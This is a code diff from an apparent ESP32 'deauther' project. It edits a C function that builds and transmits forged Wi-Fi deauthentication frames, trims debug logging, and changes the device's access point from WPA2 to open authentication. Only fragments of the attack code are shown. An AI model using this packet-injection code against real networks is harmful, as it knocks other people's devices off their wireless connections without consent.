@@ -18,7 +18,7 @@ const uint8_t deauthPacket[] = {
 esp_err_t deauth(const MacAddr target, const MacAddr source,
         const MacAddr bssid, uint8_t reason, uint8_t channel) {
     
-    esp_err_t res = esp32_deauther_configure_wifi(channel);
+    //esp_err_t res = esp32_deauther_configure_wifi(channel);
 
     memcpy(buffer, deauthPacket, sizeof(deauthPacket));
 
@@ -26,11 +26,11 @@ esp_err_t deauth(const MacAddr target, const MacAddr source,
     memcpy(&buffer[16], bssid, 6);
 
     seqnum++;
-    for(int i=0; i<sizeof(deauthPacket);i++){
-        ESP_LOGI(TASK_NAME, "packet byte %d:  %x ", i, buffer[i]);
-    }
-
-    res = raw(buffer, sizeof(deauthPacket), false);
+    // for(int i=0; i<sizeof(deauthPacket);i++){
+    //     ESP_LOGI(TASK_NAME, "packet byte %d:  %x ", i, buffer[i]);
+    // }
+    ESP_LOGI(TASK_NAME, "pacchetto deauth");
+    esp_err_t res = raw(buffer, sizeof(deauthPacket), false);
     ESP_LOGI(TASK_NAME, "result: %s", esp_err_to_name(res));
 
     return res;
@@ -45,9 +45,8 @@ esp_err_t esp32_deauther_configure_wifi(uint8_t channel){
     wifi_config_t ap_config = {};
     strcpy((char*)ap_config.ap.ssid,"Prosciutto wifi");
     ap_config.ap.ssid_len = 10;
-    strcpy((char*)ap_config.ap.password,"prosciutto_w");
     ap_config.ap.channel = channel;
-    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK,
+    ap_config.ap.authmode = WIFI_AUTH_OPEN,
     ap_config.ap.ssid_hidden = 0;
     ap_config.ap.max_connection = 4;
     ap_config.ap.beacon_interval = 60000;
